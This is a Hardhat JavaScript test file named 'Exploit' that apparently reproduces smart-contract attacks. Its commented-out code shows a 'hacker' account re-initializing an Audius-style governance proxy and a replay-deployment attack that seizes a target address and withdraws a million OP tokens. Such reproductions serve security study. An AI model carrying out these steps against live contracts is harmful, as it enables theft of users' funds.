const hardhat = require('hardhat');
const { ethers } = hardhat;
const { expect } = require('chai');
const web3 = require('web3');

describe('Exploit', async () => {
  let deployer, guardian, proxyAdmin, hacker;
  let governance, registry;
  let votingPeriod = 13292;
  let excutionDelay = 6646;
  let votingQuorumPercent = 5;
  let maxInProgressProposals = 10;

  beforeEach(async () => {
    [deployer, guardian, proxyAdmin, hacker] = await ethers.getSigners();

    // let Proxy = await ethers.getContractFactory('AudiusAdminUpgradeabilityProxy');

    // let Registry = await ethers.getContractFactory('Registry');
    // registryLogic = await Registry.connect(deployer).deploy();

    // let registryProxy = await Proxy.connect(deployer).deploy(
    //   registryLogic.address,
    //   proxyAdmin.address,
    //   registryLogic.interface.encodeFunctionData('initialize2', [])
    // );

    // registry = await ethers.getContractAt('Registry', registryProxy.address);

    // // 0x5265676973747279000000000000000000000000000000000000000000000000 = 'Registry'
    // await registry
    //   .connect(deployer)
    //   .addContract(
    //     '0x5265676973747279000000000000000000000000000000000000000000000000',
    //     registry.address
    //   );

    // let Governance = await ethers.getContractFactory('Governance');
    // let governanceLogic = await Governance.connect(deployer).deploy();

    // let governanceProxy = await Proxy.connect(deployer).deploy(
    //   governanceLogic.address,
    //   proxyAdmin.address,
    //   governanceLogic.interface.encodeFunctionData('initialize2', [
    //     registry.address,
    //     votingPeriod,
    //     excutionDelay,
    //     votingQuorumPercent,
    //     maxInProgressProposals,
    //     guardian.address,
    //   ])
    // );

    // governance = await ethers.getContractAt('Governance', governanceProxy.address);

    // await governanceProxy.connect(proxyAdmin).setAudiusProxyAdminAddress(governanceProxy.address);
    // await registryProxy.connect(proxyAdmin).setAudiusProxyAdminAddress(governanceProxy.address);

    // await registry.connect(deployer).transferOwnership(governance.address);

    // // 0x476f7665726e616e636500000000000000000000000000000000000000000000 = 'Governance'
    // await governance
    //   .connect(guardian)
    //   .guardianExecuteTransaction(
    //     '0x5265676973747279000000000000000000000000000000000000000000000000',
    //     0,
    //     'addContract(bytes32,address)',
    //     '0x476f7665726e616e636500000000000000000000000000000000000000000000' +
    //       '000000000000000000000000' +
    //       governance.address.substring(2)
    //   );

    // await governance
    //   .connect(hacker)
    //   .initialize(
    //     registry.address,
    //     votingPeriod,
    //     excutionDelay,
    //     votingQuorumPercent,
    //     maxInProgressProposals,
    //     guardian.address
    //   );

    let Test = await ethers.getContractFactory('Test');
    let test = await Test.connect(hacker).deploy();

    let Attack = await ethers.getContractFactory('Attack');
    let attack = await Attack.connect(hacker).deploy(test.address);

    await attack.connect(hacker).multiCall(10, 20);

    console.log(await test.a());
    console.log(await test.b());
  });

  it('Check', async () => {
    // console.log(registry.address);
    // console.log(await governance.initializing());
    // let Attack = await ethers.getContractFactory('Attack');
    // let attack = await Attack.connect(hacker).deploy(
    //   proxyFactory.address,
    //   targetAddress,
    //   opToken.address
    // );
    // await attack.connect(hacker).replayDeploy();
    // expect(await attack.found()).to.be.equal(true);
    // attack = await ethers.getContractAt('Attack', targetAddress);
    // expect(await attack.owner()).to.be.equal(hacker.address);
    // // hacker withdraw 1,000,000 OP token
    // await attack.connect(hacker).withdrawToken(hacker.address, '1000000000000000000000000');
    // console.log('\n After attack');
    // console.log("Hacker's OP balance: " + parseInt(await opToken.balanceOf(hacker.address)));
    // console.log("Target's OP balance: " + parseInt(await opToken.balanceOf(targetAddress)));
  });
});
